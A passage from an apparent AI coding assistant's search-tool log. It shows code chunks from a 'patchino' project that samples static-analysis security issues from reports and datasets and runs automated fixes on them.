03110694885254},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{"line":340,"column":10},"endPosition":{"line":374,"column":14}},"signatures":{}},"score":0.3197915554046631},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{"line":1,"column":1},"endPosition":{"line":41,"column":2}},"signatures":{}},"score":0.31523633003234863},{"codeBlock":{"relativeWorkspacePath":"patchino/tests/conftest.py","range":{"startPosition":{"line":1,"column":1},"endPosition":{"line":21,"column":56}},"signatures":{}},"score":0.3096945881843567},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{"line":268,"column":18},"endPosition":{"line":316,"column":75}},"signatures":{}},"score":0.30686768889427185},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{"line":316,"column":75},"endPosition":{"line":340,"column":10}},"signatures":{"ranges":[{"startPosition":{"line":271,"column":1},"endPosition":{"line":272,"column":5}}]}},"score":0.2911666929721832},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/backend/mutations/run_sampler.py","range":{"startPosition":{"line":71,"column":86},"endPosition":{"line":103,"column":27}},"signatures":{"ranges":[{"startPosition":{"line":18,"column":1},"endPosition":{"line":19,"column":1}},{"startPosition":{"line":19,"column":1},"endPosition":{"line":24,"column":5}}]}},"score":0.2901548147201538},{"codeBlock":{"relativeWorkspacePath":"services/node_general_backend/src/maintenance/try_now.ts","range":{"startPosition":{"line":1,"column":1},"endPosition":{"line":40,"column":5}},"signatures":{}},"score":0.2817254960536957},{"codeBlock":{"relativeWorkspacePath":"patchino/tests/conftest.py","range":{"startPosition":{"line":186,"column":28},"endPosition":{"line":208,"column":27}},"signatures":{}},"score":0.2698521614074707},{"codeBlock":{"relativeWorkspacePath":"pycommon/tests/conftest.py","range":{"startPosition":{"line":1,"column":1},"endPosition":{"line":42,"column":22}},"signatures":{}},"score":0.2692480683326721},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{"line":374,"column":14},"endPosition":{"line":399,"column":19}},"signatures":{"ranges":[{"startPosition":{"line":343,"column":1},"endPosition":{"line":344,"column":5}}]}},"score":0.2687819004058838}]}",
          "rawArguments": "{"query": "samples directory patchino _samples", "target_directories": []}",
          "result": "{"codeResults":[{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{"line":233},"endPosition":{"line":339}},"contents":"\\n\\n\\nasync def main(\\n    input_config_abs_path: str = str(SCRIPT_PATH / \\"../sampler_config.json\\"),\\n):\\n    with open(input_config_abs_path, \\"r\\") as f:\\n        input_config = SamplerConfig.from_json(f.read())\\n\\n    print(f\\"Sampler config: {input_config}\\")\\n    print(f\\"DATASET_DATA_FOLDER_PATH: {DATASET_DATA_FOLDER_PATH}\\")\\n\\n    samples = []\\n\\n    samples += await _get_customer_report_samples(input_config)\\n    samples += await _get_dataset_samples(input_config)\\n\\n    samples = samples[0 : input_config.max_sample_count]\\n\\n    sast_issue_type_used = set([s.issue.raw_issue_type for s in samples])\\n\\n    if sast_issue_type_used != set(input_config.sast_issue_types):\\n        unused_issue_types = set(input_config.sast_issue_types) - sast_issue_type_used\\n        print(\\n            f\\"Some of the issue types were not found or ignored due to samples count: {unused_issue_types}\\"\\n        )\\n\\n    await _save_output(input_config, samples)\\n    print(\\"Done\\")","originalContents":"\\n\\n\\nasync def main(\\n    input_config_abs_path: str = str(SCRIPT_PATH / \\"../sampler_config.json\\"),\\n):\\n    with open(input_config_abs_path, \\"r\\") as f:\\n        input_config = SamplerConfig.from_json(f.read())\\n\\n    print(f\\"Sampler config: {input_config}\\")\\n    print(f\\"DATASET_DATA_FOLDER_PATH: {DATASET_DATA_FOLDER_PATH}\\")\\n\\n    samples = []\\n\\n    samples += await _get_customer_report_samples(input_config)\\n    samples += await _get_dataset_samples(input_config)\\n\\n    samples = samples[0 : input_config.max_sample_count]\\n\\n    sast_issue_type_used = set([s.issue.raw_issue_type for s in samples])\\n\\n    if sast_issue_type_used != set(input_config.sast_issue_types):\\n        unused_issue_types = set(input_config.sast_issue_types) - sast_issue_type_used\\n        print(\\n            f\\"Some of the issue types were not found or ignored due to samples count: {unused_issue_types}\\"\\n        )\\n\\n    await _save_output(input_config, samples)\\n    print(\\"Done\\")","detailedLines":[{"text":"@dataclass","lineNumber":234},{"text":"class Sample:","lineNumber":235,"isSignature":true},{"lineNumber":237},{"text":"    report_path: str","lineNumber":238},{"text":"    source_archive_path: str","lineNumber":239},{"text":"    is_public: bool","lineNumber":240,"isSignature":true},{"lineNumber":241},{"lineNumber":242},{"text":"async def main(","lineNumber":243,"isSignature":true},{"text":"    input_config_abs_path: str = str(SCRIPT_PATH / \\"../sampler_config.json\\"),","lineNumber":244,"isSignature":true},{"text":"):","lineNumber":245,"isSignature":true},{"text":"    with open(input_config_abs_path, \\"r\\") as f:","lineNumber":246},{"text":"        input_config = SamplerConfig.from_json(f.read())","lineNumber":247},{"lineNumber":248},{"text":"    print(f\\"Sampler config: {input_config}\\")","lineNumber":249},{"text":"    print(f\\"DATASET_DATA_FOLDER_PATH: {DATASET_DATA_FOLDER_PATH}\\")","lineNumber":250},{"lineNumber":251},{"text":"    samples = []","lineNumber":252},{"lineNumber":253},{"text":"    samples += await _get_customer_report_samples(input_config)","lineNumber":254},{"text":"    samples += await _get_dataset_samples(input_config)","lineNumber":255},{"lineNumber":256},{"text":"    samples = samples[0 : input_config.max_sample_count]","lineNumber":257},{"lineNumber":258},{"text":"    sast_issue_type_used = set([s.issue.raw_issue_type for s in samples])","lineNumber":259},{"lineNumber":260},{"text":"    if sast_issue_type_used != set(input_config.sast_issue_types):","lineNumber":261},{"text":"        unused_issue_types = set(input_config.sast_issue_types) - sast_issue_type_used","lineNumber":262},{"text":"        print(","lineNumber":263},{"text":"            f\\"Some of the issue types were not found or ignored due to samples count: {unused_issue_types}\\"","lineNumber":264},{"text":"        )","lineNumber":265},{"lineNumber":266},{"text":"    await _save_output(input_config, samples)","lineNumber":267},{"text":"    print(\\"Done\\")","lineNumber":268,"isSignature":true},{"lineNumber":269},{"lineNumber":270},{"text":"async def _save_output(config: SamplerConfig, samples: list[Sample]) -> None:","lineNumber":271,"isSignature":true},{"text":"    ","lineNumber":272}]},"score":0.3773112893104553},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{"line":168,"column":33},"endPosition":{"line":239}},"contents":"\\n    \\"microsoft entity framework core\\": None,\\n    \\"microsoft extensions logger\\": None,\\n    \\"mybatis configuration\\": None,\\n    \\"objc\\": None,\\n    \\"objective-c core\\": None,\\n    \\"openapi configuration\\": None,\\n    \\"password secrets\\": None,\\n    \\"perl\\": None,\\n    \\"php\\": \\"php\\",\\n    \\"php configuration\\": \\"php\\",\\n    \\"php debug\\": \\"php\\",\\n    \\"plsql\\": None,\\n    \\"problem-based-packs\\": None,\\n    \\"py\\": \\"python\\",\\n    \\"python\\": \\"python\\",\\n    \\"python core\\": \\"python\\",\\n    \\"python core hashlib\\": \\"python\\",\\n    \\"python core os\\": \\"python\\",\\n    \\"python core random\\": \\"python\\",\\n    \\"python core shutil\\": \\"python\\",\\n    \\"python core sqlite3\\": \\"python\\",\\n    \\"python core subprocess\\": \\"python\\",\\n    \\"python lxml\\": \\"python\\",\\n    \\"python mysql\\": \\"python\\",\\n    \\"python mysqldb\\": \\"python\\",\\n    \\"ruby\\": None,\\n    \\"scala\\": None,\\n    \\"secrets\\": None,\\n    \\"sql core\\": None,\\n    \\"swift\\": None,\\n    \\"terraform\\": None,\\n    \\"text\\": None,\\n    \\"trailofbits\\": None,\\n    \\"trojan source\\": None,\\n    \\"ts\\": None,\\n    \\"typescript\\": None,\\n    \\"typescript angular\\": None,\\n    \\"vbnet\\": None,\\n    \\"web\\": None,\\n    \\"xml\\": \\"xml\\",\\n    \\"xml schema\\": \\"xml\\",\\n    \\"yaml\\": None,\\n    \\"yaml core\\": None,\\n    \\"\\": None,\\n}\\n\\n\\nclass SamplerConfig(BaseModel):\\n    sast_issue_types: Annotated[list[str], Len(min_length=1)]\\n    sast_issue_languages: Annotated[list[str], Len(min_length=1)]\\n    output_dir_path: str = str(SCRIPT_PATH / \\"../_samples\\")\\n    customer_report_path: Optional[str] = None\\n    customer_source_archive_path: Optional[str] = None\\n    customer_report_issue_indexes: Optional[list[int]] = None\\n    max_sample_count: int = 10\\n    is_from_docker: bool = False\\n\\n    @classmethod\\n    def from_json(cls, json_str: str) -> SamplerConfig:\\n        data = json.loads(json_str)\\n        return cls.model_validate(data)","originalContents":"\\n    \\"microsoft entity framework core\\": None,\\n    \\"microsoft extensions logger\\": None,\\n    \\"mybatis configuration\\": None,\\n    \\"objc\\": None,\\n    \\"objective-c core\\": None,\\n    \\"openapi configuration\\": None,\\n    \\"password secrets\\": None,\\n    \\"perl\\": None,\\n    \\"php\\": \\"php\\",\\n    \\"php configuration\\": \\"php\\",\\n    \\"php debug\\": \\"php\\",\\n    \\"plsql\\": None,\\n    \\"problem-based-packs\\": None,\\n    \\"py\\": \\"python\\",\\n    \\"python\\": \\"python\\",\\n    \\"python core\\": \\"python\\",\\n    \\"python core hashlib\\": \\"python\\",\\n    \\"python core os\\": \\"python\\",\\n    \\"python core random\\": \\"python\\",\\n    \\"python core shutil\\": \\"python\\",\\n    \\"python core sqlite3\\": \\"python\\",\\n    \\"python core subprocess\\": \\"python\\",\\n    \\"python lxml\\": \\"python\\",\\n    \\"python mysql\\": \\"python\\",\\n    \\"python mysqldb\\": \\"python\\",\\n    \\"ruby\\": None,\\n    \\"scala\\": None,\\n    \\"secrets\\": None,\\n    \\"sql core\\": None,\\n    \\"swift\\": None,\\n    \\"terraform\\": None,\\n    \\"text\\": None,\\n    \\"trailofbits\\": None,\\n    \\"trojan source\\": None,\\n    \\"ts\\": None,\\n    \\"typescript\\": None,\\n    \\"typescript angular\\": None,\\n    \\"vbnet\\": None,\\n    \\"web\\": None,\\n    \\"xml\\": \\"xml\\",\\n    \\"xml schema\\": \\"xml\\",\\n    \\"yaml\\": None,\\n    \\"yaml core\\": None,\\n    \\"\\": None,\\n}\\n\\n\\nclass SamplerConfig(BaseModel):\\n    sast_issue_types: Annotated[list[str], Len(min_length=1)]\\n    sast_issue_languages: Annotated[list[str], Len(min_length=1)]\\n    output_dir_path: str = str(SCRIPT_PATH / \\"../_samples\\")\\n    customer_report_path: Optional[str] = None\\n    customer_source_archive_path: Optional[str] = None\\n    customer_report_issue_indexes: Optional[list[int]] = None\\n    max_sample_count: int = 10\\n    is_from_docker: bool = False\\n\\n    @classmethod\\n    def from_json(cls, json_str: str) -> SamplerConfig:\\n        data = json.loads(json_str)\\n        return cls.model_validate(data)","detailedLines":[{"text":"    \\"microsoft aspnetcore mvc\\": None,","lineNumber":170},{"text":"    \\"microsoft entity framework core\\": None,","lineNumber":171},{"text":"    \\"microsoft extensions logger\\": None,","lineNumber":172},{"text":"    \\"mybatis configuration\\": None,","lineNumber":173},{"text":"    \\"objc\\": None,","lineNumber":174},{"text":"    \\"objective-c core\\": None,","lineNumber":175},{"text":"    \\"openapi configuration\\": None,","lineNumber":176},{"text":"    \\"password secrets\\": None,","lineNumber":177},{"text":"    \\"perl\\": None,","lineNumber":178},{"text":"    \\"php\\": \\"php\\",","lineNumber":179},{"text":"    \\"php configuration\\": \\"php\\",","lineNumber":180},{"text":"    \\"php debug\\": \\"php\\",","lineNumber":181},{"text":"    \\"plsql\\": None,","lineNumber":182},{"text":"    \\"problem-based-packs\\": None,","lineNumber":183},{"text":"    \\"py\\": \\"python\\",","lineNumber":184},{"text":"    \\"python\\": \\"python\\",","lineNumber":185},{"text":"    \\"python core\\": \\"python\\",","lineNumber":186},{"text":"    \\"python core hashlib\\": \\"python\\",","lineNumber":187},{"text":"    \\"python core os\\": \\"python\\",","lineNumber":188},{"text":"    \\"python core random\\": \\"python\\",","lineNumber":189},{"text":"    \\"python core shutil\\": \\"python\\",","lineNumber":190},{"text":"    \\"python core sqlite3\\": \\"python\\",","lineNumber":191},{"text":"    \\"python core subprocess\\": \\"python\\",","lineNumber":192},{"text":"    \\"python lxml\\": \\"python\\",","lineNumber":193},{"text":"    \\"python mysql\\": \\"python\\",","lineNumber":194},{"text":"    \\"python mysqldb\\": \\"python\\",","lineNumber":195},{"text":"    \\"ruby\\": None,","lineNumber":196},{"text":"    \\"scala\\": None,","lineNumber":197},{"text":"    \\"secrets\\": None,","lineNumber":198},{"text":"    \\"sql core\\": None,","lineNumber":199},{"text":"    \\"swift\\": None,","lineNumber":200},{"text":"    \\"terraform\\": None,","lineNumber":201},{"text":"    \\"text\\": None,","lineNumber":202},{"text":"    \\"trailofbits\\": None,","lineNumber":203},{"text":"    \\"trojan source\\": None,","lineNumber":204},{"text":"    \\"ts\\": None,","lineNumber":205},{"text":"    \\"typescript\\": None,","lineNumber":206},{"text":"    \\"typescript angular\\": None,","lineNumber":207},{"text":"    \\"vbnet\\": None,","lineNumber":208},{"text":"    \\"web\\": None,","lineNumber":209},{"text":"    \\"xml\\": \\"xml\\",","lineNumber":210},{"text":"    \\"xml schema\\": \\"xml\\",","lineNumber":211},{"text":"    \\"yaml\\": None,","lineNumber":212},{"text":"    \\"yaml core\\": None,","lineNumber":213},{"text":"    \\"\\": None,","lineNumber":214},{"text":"}","lineNumber":215},{"lineNumber":216},{"lineNumber":217},{"text":"class SamplerConfig(BaseModel):","lineNumber":218,"isSignature":true},{"text":"    sast_issue_types: Annotated[list[str], Len(min_length=1)]","lineNumber":219},{"text":"    sast_issue_languages: Annotated[list[str], Len(min_length=1)]","lineNumber":220},{"text":"    output_dir_path: str = str(SCRIPT_PATH / \\"../_samples\\")","lineNumber":221},{"text":"    customer_report_path: Optional[str] = None","lineNumber":222},{"text":"    customer_source_archive_path: Optional[str] = None","lineNumber":223},{"text":"    customer_report_issue_indexes: Optional[list[int]] = None","lineNumber":224},{"text":"    max_sample_count: int = 10","lineNumber":225},{"text":"    is_from_docker: bool = False","lineNumber":226},{"lineNumber":227},{"text":"    @classmethod","lineNumber":228},{"text":"    def from_json(cls, json_str: str) -> SamplerConfig:","lineNumber":229},{"text":"        data = json.loads(json_str)","lineNumber":230},{"text":"        return cls.model_validate(data)","lineNumber":231,"isSignature":true},{"lineNumber":232},{"lineNumber":233},{"text":"@dataclass","lineNumber":234},{"text":"class Sample:","lineNumber":235,"isSignature":true},{"text":"    issue: Issue","lineNumber":236},{"text":"    report: BaseReportStream","lineNumber":237}]},"score":0.35427165031433105},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{"line":398,"column":18},"endPosition":{"line":497}},"contents":"async def _get_dataset_samples(config: SamplerConfig) -> list[Sample]:\\n\\n\\n    ...\\n\\n\\n    while len(samples) <= config.max_sample_count and len(repo_to_issue_indexes) > 0:\\n        sast_report_summary_path = random.choice(list(repo_to_issue_indexes.keys()))\\n        issue_indexes = repo_to_issue_indexes[sast_report_summary_path]\\n        issue_index = random.choice(issue_indexes)\\n\\n        sast_report_path = sast_report_summary_path.absolute().with_suffix(\\"\\")\\n        source_code_zip_path = sast_report_summary_path.absolute().parent / \\"repo.zip\\"\\n\\n        issues, report = await _get_report_issues(\\n            sast_report_path,\\n            source_code_zip_path,\\n        )\\n        issue = issues[issue_index]\\n\\n        if issue.fingerprint_hash:\\n            samples.append(\\n                Sample(\\n                    issue=issues[issue_index],\\n                    report=report,\\n                    report_path=sast_report_path,\\n                    source_archive_path=source_code_zip_path,\\n                    is_public=True,\\n                )\\n            )\\n        else:\\n            print(\\n                f\\"Skipping issue {issue.index} because cannot calculate fingerprint hash {str(sast_report_path)}\\"\\n            )\\n\\n        repo_to_issue_indexes[sast_report_summary_path].remove(issue_index)\\n\\n        if len(repo_to_issue_indexes[sast_report_summary_path]) == 0:\\n            del repo_to_issue_indexes[sast_report_summary_path]\\n\\n    return samples","originalContents":"\\n\\n    while len(samples) <= config.max_sample_count and len(repo_to_issue_indexes) > 0:\\n        sast_report_summary_path = random.choice(list(repo_to_issue_indexes.keys()))\\n        issue_indexes = repo_to_issue_indexes[sast_report_summary_path]\\n        issue_index = random.choice(issue_indexes)\\n\\n        sast_report_path = sast_report_summary_path.absolute().with_suffix(\\"\\")\\n        source_code_zip_path = sast_report_summary_path.absolute().parent / \\"repo.zip\\"\\n\\n        issues, report = await _get_report_issues(\\n            sast_report_path,\\n            source_code_zip_path,\\n        )\\n        issue = issues[issue_index]\\n\\n        if issue.fingerprint_hash:\\n            samples.append(\\n                Sample(\\n                    issue=issues[issue_index],\\n                    report=report,\\n                    report_path=sast_report_path,\\n                    source_archive_path=source_code_zip_path,\\n                    is_public=True,\\n                )\\n            )\\n        else:\\n            print(\\n                f\\"Skipping issue {issue.index} because cannot calculate fingerprint hash {str(sast_report_path)}\\"\\n            )\\n\\n        repo_to_issue_indexes[sast_report_summary_path].remove(issue_index)\\n\\n        if len(repo_to_issue_indexes[sast_report_summary_path]) == 0:\\n            del repo_to_issue_indexes[sast_report_summary_path]\\n\\n    return samples","detailedLines":[{"text":"async def _get_dataset_samples(config: SamplerConfig) -> list[Sample]:","lineNumber":402,"isSignature":true},{"text":"    samples = []","lineNumber":403},{"text":"(indexes)","lineNumber":428},{"lineNumber":429},{"text":"    print(f\\"Found {len(repo_to_issue_indexes)} dataset repositories with issues\\")","lineNumber":430},{"lineNumber":431},{"text":"    while len(samples) <= config.max_sample_count and len(repo_to_issue_indexes) > 0:","lineNumber":432},{"text":"        sast_report_summary_path = random.choice(list(repo_to_issue_indexes.keys()))","lineNumber":433},{"text":"        issue_indexes = repo_to_issue_indexes[sast_report_summary_path]","lineNumber":434},{"text":"        issue_index = random.choice(issue_indexes)","lineNumber":435},{"lineNumber":436},{"text":"        sast_report_path = sast_report_summary_path.absolute().with_suffix(\\"\\")","lineNumber":437},{"text":"        source_code_zip_path = sast_report_summary_path.absolute().parent / \\"repo.zip\\"","lineNumber":438},{"lineNumber":439},{"text":"        issues, report = await _get_report_issues(","lineNumber":440},{"text":"            sast_report_path,","lineNumber":441},{"text":"            source_code_zip_path,","lineNumber":442},{"text":"        )","lineNumber":443},{"text":"        issue = issues[issue_index]","lineNumber":444},{"lineNumber":445},{"text":"        if issue.fingerprint_hash:","lineNumber":446},{"text":"            samples.append(","lineNumber":447},{"text":"                Sample(","lineNumber":448},{"text":"                    issue=issues[issue_index],","lineNumber":449},{"text":"                    report=report,","lineNumber":450},{"text":"                    report_path=sast_report_path,","lineNumber":451},{"text":"                    source_archive_path=source_code_zip_path,","lineNumber":452},{"text":"                    is_public=True,","lineNumber":453},{"text":"                )","lineNumber":454},{"text":"            )","lineNumber":455},{"text":"        else:","lineNumber":456},{"text":"            print(","lineNumber":457},{"text":"                f\\"Skipping issue {issue.index} because cannot calculate fingerprint hash {str(sast_report_path)}\\"","lineNumber":458},{"text":"            )","lineNumber":459},{"lineNumber":460},{"text":"        repo_to_issue_indexes[sast_report_summary_path].remove(issue_index)","lineNumber":461},{"lineNumber":462},{"text":"        if len(repo_to_issue_indexes[sast_report_summary_path]) == 0:","lineNumber":463},{"text":"            del repo_to_issue_indexes[sast_report_summary_path]","lineNumber":464},{"lineNumber":465},{"text":"    return samples","lineNumber":466,"isSignature":true},{"lineNumber":467},{"lineNumber":468},{"text":"@locked_alru_cache","lineNumber":469},{"text":"async def _get_report_issues(","lineNumber":470,"isSignature":true},{"text":"    sast_report_path: pathlib.Path, source_code_zip_path: pathlib.Path","lineNumber":471,"isSignature":true},{"text":") -> tuple[list[Issue], BaseReportStream]:","lineNumber":472,"isSignature":true},{"text":"    ","lineNumber":473}]},"score":0.34733879566192627},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{"line":342},"endPosition":{"line":465}},"contents":"\\n\\n\\nasync def _get_dataset_samples(config: SamplerConfig) -> list[Sample]:\\n    samples = []\\n    repo_to_issue_indexes = defaultdict(list)\\n    for sast_report_summary_path in DATASET_DATA_FOLDER_PATH.rglob(\\"**/*.json\\"):\\n        with open(sast_report_summary_path, \\"r\\") as f:\\n            data = json.load(f)\\n\\n        # create a set of reports, and a dicionary from report to issue list indexes\\n        for language, dict_severity_to_type in data.items():\\n            if (\\n                language_mapping.get(language.lower(), \\"\\")\\n                not in config.sast_issue_languages\\n                and language not in config.sast_issue_languages\\n            ):\\n                continue\\n\\n            for severity, issue_type_to_issue_data in dict_severity_to_type.items():\\n                for issue_type, issue_data in issue_type_to_issue_data.items():\\n                    if issue_type not in config.sast_issue_types:\\n                        continue\\n\\n                    indexes = issue_data[\\"indexes\\"]\\n\\n                    if len(indexes) == 0:\\n                        continue\\n\\n                    repo_to_issue_indexes[sast_report_summary_path].extend(indexes)\\n\\n    print(f\\"Found {len(repo_to_issue_indexes)} dataset repositories with issues\\")","originalContents":"\\n\\n\\nasync def _get_dataset_samples(config: SamplerConfig) -> list[Sample]:\\n    samples = []\\n    repo_to_issue_indexes = defaultdict(list)\\n    for sast_report_summary_path in DATASET_DATA_FOLDER_PATH.rglob(\\"**/*.json\\"):\\n        with open(sast_report_summary_path, \\"r\\") as f:\\n            data = json.load(f)\\n\\n        # create a set of reports, and a dicionary from report to issue list indexes\\n        for language, dict_severity_to_type in data.items():\\n            if (\\n                language_mapping.get(language.lower(), \\"\\")\\n                not in config.sast_issue_languages\\n                and language not in config.sast_issue_languages\\n            ):\\n                continue\\n\\n            for severity, issue_type_to_issue_data in dict_severity_to_type.items():\\n                for issue_type, issue_data in issue_type_to_issue_data.items():\\n                    if issue_type not in config.sast_issue_types:\\n                        continue\\n\\n                    indexes = issue_data[\\"indexes\\"]\\n\\n                    if len(indexes) == 0:\\n                        continue\\n\\n                    repo_to_issue_indexes[sast_report_summary_path].extend(indexes)\\n\\n    print(f\\"Found {len(repo_to_issue_indexes)} dataset repositories with issues\\")","detailedLines":[{"text":"async def _get_customer_report_samples(config: SamplerConfig) -> list[Sample]:","lineNumber":343,"isSignature":true},{"lineNumber":398},{"text":"    return samples","lineNumber":399,"isSignature":true},{"lineNumber":400},{"lineNumber":401},{"text":"async def _get_dataset_samples(config: SamplerConfig) -> list[Sample]:","lineNumber":402,"isSignature":true},{"text":"    samples = []","lineNumber":403},{"text":"    repo_to_issue_indexes = defaultdict(list)","lineNumber":404},{"text":"    for sast_report_summary_path in DATASET_DATA_FOLDER_PATH.rglob(\\"**/*.json\\"):","lineNumber":405},{"text":"        with open(sast_report_summary_path, \\"r\\") as f:","lineNumber":406},{"text":"            data = json.load(f)","lineNumber":407},{"lineNumber":408},{"text":"        # create a set of reports, and a dicionary from report to issue list indexes","lineNumber":409},{"text":"        for language, dict_severity_to_type in data.items():","lineNumber":410},{"text":"            if (","lineNumber":411},{"text":"                language_mapping.get(language.lower(), \\"\\")","lineNumber":412},{"text":"                not in config.sast_issue_languages","lineNumber":413},{"text":"                and language not in config.sast_issue_languages","lineNumber":414},{"text":"            ):","lineNumber":415},{"text":"                continue","lineNumber":416},{"lineNumber":417},{"text":"            for severity, issue_type_to_issue_data in dict_severity_to_type.items():","lineNumber":418},{"text":"                for issue_type, issue_data in issue_type_to_issue_data.items():","lineNumber":419},{"text":"                    if issue_type not in config.sast_issue_types:","lineNumber":420},{"text":"                        continue","lineNumber":421},{"lineNumber":422},{"text":"                    indexes = issue_data[\\"indexes\\"]","lineNumber":423},{"lineNumber":424},{"text":"                    if len(indexes) == 0:","lineNumber":425},{"text":"                        continue","lineNumber":426},{"lineNumber":427},{"text":"                    repo_to_issue_indexes[sast_report_summary_path].extend(indexes)","lineNumber":428},{"lineNumber":429},{"text":"    print(f\\"Found {len(repo_to_issue_indexes)} dataset repositories with issues\\")","lineNumber":430},{"lineNumber":431},{"text":"    while","lineNumber":432}]},"score":0.3328891098499298},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/issue_processor.py","range":{"startPosition":{"line":162},"endPosition":{"line":421}},"contents":"\\n\\n\\nasync def main():\\n    setup_json_logging(level=logging.INFO)\\n    # The config_path will be received as parameter\\n\\n    if len(sys.argv) > 1:\\n        config_path = sys.argv[1]\\n    else:\\n        # Default if no parameter is provided\\n        config_path = str(SCRIPT_PATH / \\"../_samples/samples.json\\")\\n\\n    config = ConfigManager(config_path)\\n    s3_connection = S3Access.init_connection(\\n        name=\\"patchino\\",\\n        endpoint=(\\n            AWS_S3_ENDPOINT_FROM_DOCKER if config.is_from_docker else AWS_S3_ENDPOINT\\n        ),\\n        access_key_id=AWS_S3_ACCESS_KEY_ID,\\n        secret_access_key=AWS_S3_SECRET_ACCESS_KEY,\\n        bucket=AWS_S3_STORAGE_BUCKET,\\n        region=AWS_S3_STORAGE_REGION,\\n    )\\n\\n    logger.info(f\\"Config created at: {config.created_at}\\")\\n    logger.info(f\\"Total issues: {len(config.issues_info)}\\")\\n    logger.info(f\\"Public issues: {len(config.get_public_issues())}\\")\\n    logger.info(f\\"Non-skipped issues: {len(config.get_non_skipped_issues())}\\")\\n\\n    logger.info(\\"\\\\nAll Issues:\\")\\n    for idx, issue_info in enumerate(config.issues_info):\\n        logger.info(f\\"{idx + 1}. {issue_info}\\")\\n\\n    logger.info(\\"\\\\nLoading issue objects:\\")\\n    all_issue_objects = [\\n        issue_info\\n        for issue_info in config.get_non_skipped_issues()\\n        if issue_info.issue_object\\n    ]\\n    fix_issues_results = await process_objects_in_parallel(\\n        all_issue_objects, fix_issue, batch_size=FIX_ISSUE_BATCH_SIZE\\n    )\\n\\n    all_issues = []\\n    success_issues: dict[str, IssueInfo] = {}\\n    all_fixed_files: dict[str, dict[str, str]] = {}","originalContents":"\\n\\n\\nasync def main():\\n    setup_json_logging(level=logging.INFO)\\n    # The config_path will be received as parameter\\n\\n    if len(sys.argv) > 1:\\n        config_path = sys.argv[1]\\n    else:\\n        # Default if no parameter is provided\\n        config_path = str(SCRIPT_PATH / \\"../_samples/samples.json\\")\\n\\n    config = ConfigManager(config_path)\\n    s3_connection = S3Access.init_connection(\\n        name=\\"patchino\\",\\n        endpoint=(\\n            AWS_S3_ENDPOINT_FROM_DOCKER if config.is_from_docker else AWS_S3_ENDPOINT\\n        ),\\n        access_key_id=AWS_S3_ACCESS_KEY_ID,\\n        secret_access_key=AWS_S3_SECRET_ACCESS_KEY,\\n        bucket=AWS_S3_STORAGE_BUCKET,\\n        region=AWS_S3_STORAGE_REGION,\\n    )\\n\\n    logger.info(f\\"Config created at: {config.created_at}\\")\\n    logger.info(f\\"Total issues: {len(config.issues_info)}\\")\\n    logger.info(f\\"Public issues: {len(config.get_public_issues())}\\")\\n    logger.info(f\\"Non-skipped issues: {len(config.get_non_skipped_issues())}\\")\\n\\n    logger.info(\\"\\\\nAll Issues:\\")\\n    for idx, issue_info in enumerate(config.issues_info):\\n        logger.info(f\\"{idx + 1}. {issue_info}\\")\\n\\n    logger.info(\\"\\\\nLoading issue objects:\\")\\n    all_issue_objects = [\\n        issue_info\\n        for issue_info in config.get_non_skipped_issues()\\n        if issue_info.issue_object\\n    ]\\n    fix_issues_results = await process_objects_in_parallel(\\n        all_issue_objects, fix_issue, batch_size=FIX_ISSUE_BATCH_SIZE\\n    )\\n\\n    all_issues = []\\n    success_issues: dict[str, IssueInfo] = {}\\n    all_fixed_files: dict[str, dict[str, str]] = {}","detailedLines":[{"text":"class ConfigManager:","lineNumber":163,"isSignature":true},{"text":"def get_issues_by_provider(self, provider: str) -> list[IssueInfo]:","lineNumber":218},{"text":" provider.lower()","lineNumber":223},{"text":"        ]","lineNumber":224},{"lineNumber":225},{"text":"    def __repr__(self):","lineNumber":226},{"text":"        return f\\"ConfigManager(created_at={self.created_at}, issues_count={len(self.issues_info)})\\"","lineNumber":227,"isSignature":true},{"lineNumber":228},{"lineNumber":229},{"text":"async def main():","lineNumber":230,"isSignature":true},{"text":"    setup_json_logging(level=logging.INFO)","lineNumber":231},{"text":"    # The config_path will be received as parameter","lineNumber":232},{"lineNumber":233},{"text":"    if len(sys.argv) > 1:","lineNumber":234},{"text":"        config_path = sys.argv[1]","lineNumber":235},{"text":"    else:","lineNumber":236},{"text":"        # Default if no parameter is provided","lineNumber":237},{"text":"        config_path = str(SCRIPT_PATH / \\"../_samples/samples.json\\")","lineNumber":238},{"lineNumber":239},{"text":"    config = ConfigManager(config_path)","lineNumber":240},{"text":"    s3_connection = S3Access.init_connection(","lineNumber":241},{"text":"        name=\\"patchino\\",","lineNumber":242},{"text":"        endpoint=(","lineNumber":243},{"text":"            AWS_S3_ENDPOINT_FROM_DOCKER if config.is_from_docker else AWS_S3_ENDPOINT","lineNumber":244},{"text":"        ),","lineNumber":245},{"text":"        access_key_id=AWS_S3_ACCESS_KEY_ID,","lineNumber":246},{"text":"        secret_access_key=AWS_S3_SECRET_ACCESS_KEY,","lineNumber":247},{"text":"        bucket=AWS_S3_STORAGE_BUCKET,","lineNumber":248},{"text":"        region=AWS_S3_STORAGE_REGION,","lineNumber":249},{"text":"    )","lineNumber":250},{"lineNumber":251},{"text":"    logger.info(f\\"Config created at: {config.created_at}\\")","lineNumber":252},{"text":"    logger.info(f\\"Total issues: {len(config.issues_info)}\\")","lineNumber":253},{"text":"    logger.info(f\\"Public issues: {len(config.get_public_issues())}\\")","lineNumber":254},{"text":"    logger.info(f\\"Non-skipped issues: {len(config.get_non_skipped_issues())}\\")","lineNumber":255},{"lineNumber":256},{"text":"    logger.info(\\"\\\\nAll Issues:\\")","lineNumber":257},{"text":"    for idx, issue_info in enumerate(config.issues_info):","lineNumber":258},{"text":"        logger.info(f\\"{idx + 1}. {issue_info}\\")","lineNumber":259},{"lineNumber":260},{"text":"    logger.info(\\"\\\\nLoading issue objects:\\")","lineNumber":261},{"text":"    all_issue_objects = 